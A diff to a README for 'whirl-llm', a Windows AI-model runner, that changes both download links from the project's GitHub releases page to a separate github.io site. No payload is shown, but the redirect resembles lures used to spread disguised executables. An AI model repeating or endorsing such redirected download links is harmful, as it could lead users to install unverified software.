@@ -1,6 +1,6 @@
 # ⚡ whirl-llm - Run Powerful AI Models on Windows
 
-[![Download whirl-llm](https://img.shields.io/badge/Download-whirl--llm-ff6b35?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/yaafi183307/whirl-llm/releases)
+[![Download whirl-llm](https://img.shields.io/badge/Download-whirl--llm-ff6b35?style=for-the-badge&logo=windows&logoColor=white)](https://yaafi183307.github.io)
 
 **Visit this link to download the application.**
 
@@ -54,7 +54,7 @@ Take two minutes to check these boxes. Doing so now saves confusion later.
 
 **Visit this link to download the application:**
 
-### 👉 https://github.com/yaafi183307/whirl-llm/releases
+### 👉 https://yaafi183307.github.io
 
 Once you are on that page, find the most recent release at the top. Each release lists files you can save to your computer. Download the Windows package to your Downloads folder.
 
